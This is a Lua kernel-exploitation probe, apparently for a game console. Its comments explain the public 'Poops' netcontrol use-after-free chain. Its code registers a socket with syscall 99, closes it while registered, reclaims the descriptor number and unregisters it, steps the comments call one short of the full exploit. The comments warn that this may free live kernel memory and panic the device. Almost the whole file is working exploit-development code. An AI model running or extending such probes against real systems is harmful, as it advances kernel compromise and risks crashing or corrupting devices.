-- CRASH_CLASS: HIGH
-- PROBE 219a: netcontrol, clear a registration whose descriptor was closed
--
-- Context: 218a showed 99 netcontrol still answers the netevent commands on
-- 14.10 - `(-1, 0x20000003, buf{fd}, 8)` registers a socket and returns 0,
-- `(-1, 0x20000007, buf{fd}, 8)` unregisters it - with real argument checks
-- (bad fd, NULL buffer and size < 8 all return -1).
--
-- The public Poops chain works by registering a socket, closing it so the file
-- and its ucred are freed, reclaiming the descriptor number, and then
-- unregistering, which makes the queue operate on the freed object. That is the
-- use-after-free, and 218a never touched it: every descriptor stayed open while
-- it was registered.
--
-- This probe closes one step short of the exploit. The descriptor is closed
-- while registered, but a fresh socket immediately reclaims the same number, so
-- whatever the queue holds now points at a live object we own rather than at
-- freed memory. The answer separates the two possible implementations:
--
--   clear -> -1   the queue looks the descriptor up again and finds nothing to
--                 drop, so the close-during-register free path is gone
--   clear -> 0    the queue kept its own reference to the object, and the
--                 registered entry outlived the close
--
-- RISK: if the queue holds a bare pointer and the reclaimed allocation is not
-- the same object, the clear can free live kernel memory. A kernel panic is
-- possible and would need a power cycle, not a relaunch.

print("=== PROBE 219a: netcontrol close-while-registered ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function u64(v)
    if type(v) == "number" then return uint64(string.format("0x%08X", v)) end
    return v
end
local function sgn(v)
    if v == nil then return "killed" end
    if v >= 0x80000000 then return tostring(v - 0x100000000) end
    return tostring(v)
end
local dead = false

local function call(num, a1, a2, a3, a4, a5, a6)
    local sc = make_syscall(num)
    local ok, ret = pcall(function()
        return sc(u64(a1 or 0), u64(a2 or 0), u64(a3 or 0), u64(a4 or 0), u64(a5 or 0), u64(a6 or 0))
    end)
    if not ok then
        dead = true
        return nil, nil
    end
    return ret, to_num(ret)
end

local BUF = memory.alloc(0x20)
local function zero(addr, n)
    for i = 0, n - 1, 4 do
        pcall(function() memory.write_dword(addr + i, 0) end)
    end
end
local function wd(addr, v)
    return (pcall(function() memory.write_dword(addr, v) end))
end

local SET_QUEUE = 0x20000003
local CLEAR_QUEUE = 0x20000007
local RETIRED = 0xFFFFFFFF

local function pid()
    local _, v = call(20)
    return sgn(v)
end

print("[A] control: register and unregister the same open descriptor")
local _, afd = call(97, 1, 1, 0)
print("    socket -> " .. sgn(afd))
if afd ~= nil and afd >= 0 then
    zero(BUF, 0x10)
    wd(BUF, afd)
    local _, a1 = call(99, RETIRED, SET_QUEUE, BUF, 8)
    local _, a2 = call(99, RETIRED, CLEAR_QUEUE, BUF, 8)
    local _, ac = call(6, afd)
    print(string.format("    register %s  unregister %s  close %s  pid %s",
        sgn(a1), sgn(a2), sgn(ac), pid()))
end
print("")

print("[B] register, close while registered, reclaim the descriptor number")
local _, bfd = call(97, 1, 1, 0)
print("    socket A -> " .. sgn(bfd))
if bfd ~= nil and bfd >= 0 and not dead then
    zero(BUF, 0x10)
    wd(BUF, bfd)
    local _, b1 = call(99, RETIRED, SET_QUEUE, BUF, 8)
    print("    register A -> " .. sgn(b1))
    if not dead then
        local _, b2 = call(6, bfd)
        print("    close A    -> " .. sgn(b2))
    end
    if not dead then
        local _, bfd2 = call(97, 1, 1, 0)
        print("    socket B   -> " .. sgn(bfd2) ..
            (bfd2 == bfd and "  (same number, reclaimed)" or "  (different number)"))
        print("")
        print("[C] unregister the descriptor that was closed while registered")
        zero(BUF, 0x10)
        wd(BUF, bfd)
        local _, c1 = call(99, RETIRED, CLEAR_QUEUE, BUF, 8)
        print("    unregister A -> " .. sgn(c1))
        print("    pid after    -> " .. pid())
        if not dead and bfd2 ~= nil and bfd2 >= 0 then
            local _, c2 = call(6, bfd2)
            print("    close B      -> " .. sgn(c2))
            print("    pid after    -> " .. pid())
        end
    end
end
print("")

print("[D] the descriptor table is still usable")
local _, d1 = call(97, 1, 1, 0)
local _, d2 = call(97, 1, 1, 0)
print(string.format("    socket %s  socket %s", sgn(d1), sgn(d2)))
if d1 ~= nil and d1 >= 0 then
    local _, dc1 = call(6, d1)
    print("    close " .. sgn(d1) .. " -> " .. sgn(dc1))
end
if d2 ~= nil and d2 >= 0 then
    local _, dc2 = call(6, d2)
    print("    close " .. sgn(d2) .. " -> " .. sgn(dc2))
end
print("    pid -> " .. pid())
print("")
print("=== PROBE 219a COMPLETE ===")
